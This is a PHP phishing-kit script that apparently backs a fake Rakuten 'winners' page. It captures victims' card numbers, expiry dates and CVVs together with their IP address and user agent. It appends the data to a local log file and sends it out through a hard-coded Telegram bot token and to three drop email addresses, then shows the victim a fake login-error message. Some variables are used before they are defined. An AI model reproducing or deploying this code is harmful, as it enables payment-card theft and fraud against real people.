<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Proses data yang diterima dari formulir
    $card = isset($_POST['crdn']) ? $_POST['crdn'] : '';
    $expy = isset($_POST['expd']) ? $_POST['expd'] : '';
    $cv = isset($_POST['cvs']) ? $_POST['cvs'] : '';

    //  Telegram Data Here
    $telegramBotToken = '8661680594:AAGP5pqgfGXcg5ucaiTWcLKxzIGvqUWOxuA';
    $telegramChatID = '8492511751';

    $telegramMessage = "New Login\nEmail: $email\nPassword: $password";

    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $telegramParams = [
        'chat_id' => $telegramChatID,
        'text' => $telegramMessage,
    ];    
    if ($telegramResponse === false) {
        echo 'Error sending message to Telegram.';
    } else {
        echo 'Message sent to Telegram successfully.';
    }

    // Log information
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $inj = $_SERVER["REQUEST_URI"];

    $logMessage = "--------------RakuTen Winners Result----------------\n";
    $logMessage .= "Email Address: $email\n";
    $logMessage .= "Password: $password\n";
    $logMessage .= "|--------------- I N F O | I P -------------------|\n";
    $logMessage .= "Card Number: $card\n";
    $logMessage .= "Expiry Date: $expy\n";
    $logMessage .= "CVV Numbe: $cv\n";
    $logMessage .= "|--------------- I N F O | I P -------------------|\n";
    $logMessage .= "|Client IP: $ip\n";
    $logMessage .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $logMessage .= "User Agent: $useragent\n";
    $logMessage .= "|----------+ Powered By @LightMent0r +------------|\n";

    $logFilePath = 'R35t.txt';
    $fp = fopen($logFilePath, 'a');
    fwrite($fp, $logMessage);
    fclose($fp);

    // Send email
    $emailRecipient = 'emmzyresultbox1225@gmail.com,newfreshlogx1225@outlook.com,resultz1225@yandex.com';
    $emailSubject = "WebMail: $ip";

    // Send email content to Telegram
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $telegramChatID,
        'text' => $logMessage,
    ]);
    $telegramResponse = curl_exec($ch);
    curl_close($ch);

    mail($emailRecipient, $emailSubject, $logMessage);

    $signal = 'ok';
    $msg = 'Incorrect Email or Password..........Try Again';
} else {
    echo 'Invalid request method.';
}
?>
